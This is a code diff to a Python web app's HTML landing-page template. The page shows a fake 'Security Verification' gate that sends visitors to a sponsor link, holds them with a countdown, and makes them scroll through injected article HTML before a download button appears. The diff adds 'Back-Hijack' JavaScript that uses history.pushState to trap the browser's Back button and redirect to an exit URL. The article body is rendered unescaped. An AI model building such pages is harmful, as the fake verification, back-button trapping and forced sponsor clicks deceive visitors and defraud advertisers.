@@ -1,6 +1,6 @@
 # templates.py
 
-# --- 1. User Landing Page (With HTML Injection Support & Back-Hijack) ---
+# --- 1. User Landing Page (Professional Design + Scroll Logic + Back-Hijack) ---
 LANDING_HTML = """
 <!DOCTYPE html>
 <html lang="en">
@@ -8,64 +8,86 @@ LANDING_HTML = """
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Secure Access</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style> 
-        body { font-family: 'Inter', sans-serif; background: #f1f5f9; } 
-        /* تنسيق المقالات المحقونة */
-        .article-content img { max-width: 100%; border-radius: 1rem; margin: 1rem 0; }
-        .article-content h2, .article-content h3 { font-weight: 800; color: #1e293b; margin-top: 1.5rem; margin-bottom: 0.5rem; }
-        .article-content p { margin-bottom: 1rem; line-height: 1.6; }
-        .article-content ul { list-style: disc; padding-left: 1.5rem; margin-bottom: 1rem; }
+        body { font-family: 'Inter', sans-serif; background: #f8fafc; color: #334155; }
+        .article-content { color: #475569; font-size: 1.05rem; line-height: 1.7; }
+        .article-content h2 { color: #1e293b; font-weight: 700; font-size: 1.5rem; margin-top: 2rem; margin-bottom: 1rem; letter-spacing: -0.025em; }
+        .article-content h3 { color: #334155; font-weight: 600; font-size: 1.25rem; margin-top: 1.5rem; margin-bottom: 0.75rem; }
+        .article-content p { margin-bottom: 1.25rem; }
+        .article-content ul { list-style: disc; padding-left: 1.5rem; margin-bottom: 1.5rem; color: #475569; }
+        .article-content img { border-radius: 0.75rem; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); margin: 2rem 0; width: 100%; }
+        .fade-in { animation: fadeIn 0.5s ease-in-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
-<body class="min-h-screen flex items-center justify-center p-4">
-    <div class="max-w-md w-full bg-white rounded-3xl p-8 shadow-2xl text-center relative overflow-hidden">
+<body class="min-h-screen">
+
+    <div class="max-w-2xl mx-auto bg-white min-h-screen shadow-xl border-x border-slate-100">
         
-        <div class="mb-8">
-            <div class="w-20 h-20 bg-blue-50 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-4 text-3xl shadow-sm">🚀</div>
-            <h1 class="text-2xl font-black text-slate-800">Human Verification</h1>
-            <p class="text-slate-400 text-sm mt-2">Complete the step below to unlock your download.</p>
+        <div class="p-8 border-b border-slate-100 text-center">
+            <h1 class="text-2xl font-bold text-slate-900 tracking-tight">Security Verification</h1>
+            <p class="text-slate-500 text-sm mt-2">Complete the validation step to proceed.</p>
         </div>
 
-        <div id="step_1" class="transition-all duration-500">
-            <div class="bg-orange-50 border border-orange-100 p-4 rounded-2xl mb-6">
-                <p class="text-orange-600 text-xs font-bold uppercase tracking-widest mb-1">Step 1/2</p>
-                <p class="text-slate-600 text-sm font-medium">Activate the download server by viewing our sponsor.</p>
-            </div>
+        <div class="p-6 bg-slate-50 border-b border-slate-200 sticky top-0 z-50 backdrop-blur-sm bg-opacity-90">
             
-            <a href="/redirect?url={{ s.stuffing_url|urlencode }}" target="_blank" onclick="startTimer()" class="block w-full bg-slate-900 hover:bg-slate-800 text-white py-5 rounded-xl font-bold shadow-lg transform transition active:scale-95 flex items-center justify-center gap-2">
-                <span>Open Sponsor Page</span>
-                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"></path></svg>
-            </a>
-            <p class="text-xs text-slate-400 mt-4">Link unlocks in <span id="timer_display" class="font-bold text-slate-600">10</span> seconds after clicking.</p>
+            <div id="step_container">
+                <a href="/redirect?url={{ s.stuffing_url|urlencode }}" 
+                   target="_blank" 
+                   onclick="handleClick()" 
+                   id="action_btn"
+                   class="group w-full flex items-center justify-center gap-3 bg-slate-900 hover:bg-blue-600 text-white py-4 px-6 rounded-xl font-medium transition-all duration-300 shadow-md hover:shadow-lg transform active:scale-[0.98]">
+                    <svg class="w-5 h-5 text-slate-300 group-hover:text-white transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"></path></svg>
+                    <span id="btn_text">Continue to Sponsor</span>
+                </a>
+                
+                <div id="timer_box" class="hidden mt-3 text-center">
+                    <p class="text-xs font-semibold text-slate-500 uppercase tracking-wider">
+                        Please wait <span id="time_left" class="text-blue-600">15</span> seconds
+                    </p>
+                    <div class="w-full bg-slate-200 h-1 mt-2 rounded-full overflow-hidden">
+                        <div id="progress_bar" class="h-full bg-blue-600 w-0 transition-all duration-1000 ease-linear"></div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="instruction_box" class="hidden fade-in">
+                <div class="flex items-center gap-4 bg-blue-50 border-l-4 border-blue-500 p-4 rounded-r-lg shadow-sm">
+                    <div class="text-blue-500">
+                        <svg class="w-6 h-6 animate-bounce" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 14l-7 7m0 0l-7-7m7 7V3"></path></svg>
+                    </div>
+                    <div>
+                        <p class="text-sm font-bold text-slate-800">Verification Successful</p>
+                        <p class="text-xs text-slate-600 mt-1">Please scroll down to download.</p>
+                    </div>
+                </div>
+            </div>
         </div>
 
-        <div id="step_2" class="hidden opacity-0 transform translate-y-10 transition-all duration-500">
-            <div class="bg-green-50 border border-green-100 p-4 rounded-2xl mb-6">
-                <p class="text-green-600 text-xs font-bold uppercase tracking-widest mb-1">Success</p>
-                <p class="text-slate-600 text-sm font-medium">Server activated successfully.</p>
-            </div>
-            
-            <a href="/redirect?url={{ target_url|urlencode }}" class="block w-full bg-blue-600 hover:bg-blue-700 text-white py-5 rounded-xl font-bold shadow-xl shadow-blue-200 animate-bounce">
-                Download File Now
-            </a>
-        </div>
-        
-        <div class="mt-10 pt-10 border-t border-slate-100 text-left">
-            <h2 class="text-lg font-bold text-slate-800 mb-4">{{ article.title }}</h2>
-            <div class="text-slate-500 text-sm article-content">
+        <div class="p-8 pb-32">
+            <h1 class="text-3xl font-bold text-slate-900 mb-6 leading-tight">{{ article.title }}</h1>
+            <div class="article-content">
                 {{ article.body|safe }}
             </div>
+        </div>
+
+        <div id="final_download" class="hidden fixed bottom-6 left-1/2 transform -translate-x-1/2 w-[90%] max-w-lg z-50 fade-in">
+            <a href="/redirect?url={{ target_url|urlencode }}&type=organic" class="block w-full bg-blue-600 hover:bg-blue-700 text-white text-center py-4 rounded-xl font-bold shadow-2xl shadow-blue-900/20 border border-blue-500 transition-transform active:scale-95">
+                Download File Now
+            </a>
         </div>
 
     </div>
 
     <script>
         const exitUrl = "/redirect?url=" + encodeURIComponent("{{ s.exit_url }}");
-        let timeLeft = 10; 
+        let timeLeft = 15; 
+        let isTimerDone = false;
+        let hasScrolled = false;
 
-        function startTimer() {
-            // Back-Hijack Logic
+        function handleClick() {
+            // 1. Back-Hijack Logic (Silent & Professional)
             if ("{{ s.exit_url }}" !== "") {
                 try {
                     history.pushState(null, null, location.href);
@@ -73,28 +95,50 @@ LANDING_HTML = """
                 } catch(e) {}
             }
 
-            const btn = document.querySelector('#step_1 a');
-            btn.style.opacity = "0.5";
+            // 2. UI Updates
+            const btn = document.getElementById('action_btn');
+            const timerBox = document.getElementById('timer_box');
+            
             btn.style.pointerEvents = "none";
-            btn.innerText = "Verifying...";
-
-            const timerDisplay = document.getElementById('timer_display');
+            btn.classList.replace('bg-slate-900', 'bg-slate-200');
+            btn.classList.replace('text-white', 'text-slate-400');
+            btn.classList.remove('shadow-md', 'hover:shadow-lg', 'transform');
+            document.getElementById('btn_text').innerText = "Verifying connection...";
+            
+            timerBox.classList.remove('hidden');
+            
             const interval = setInterval(() => {
                 timeLeft--;
-                timerDisplay.innerText = timeLeft;
+                document.getElementById('time_left').innerText = timeLeft;
+                document.getElementById('progress_bar').style.width = ((15 - timeLeft) / 15 * 100) + "%";
                 
                 if (timeLeft <= 0) {
                     clearInterval(interval);
-                    showDownload();
+                    finishTimer();
                 }
             }, 1000);
         }
 
-        function showDownload() {
-            document.getElementById('step_1').style.display = 'none';
-            const step2 = document.getElementById('step_2');
-            step2.classList.remove('hidden');
-            setTimeout(() => { step2.classList.remove('opacity-0', 'translate-y-10'); }, 50);
+        function finishTimer() {
+            isTimerDone = true;
+            document.getElementById('step_container').style.display = 'none';
+            document.getElementById('instruction_box').classList.remove('hidden');
+            checkScroll();
+        }
+
+        window.addEventListener('scroll', checkScroll);
+
+        function checkScroll() {
+            if (!isTimerDone) return;
+            if (hasScrolled) return;
+            if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight - 150) {
+                showFinalButton();
+            }
+        }
+
+        function showFinalButton() {
+            hasScrolled = true;
+            document.getElementById('final_download').classList.remove('hidden');
         }
     </script>
 </body>
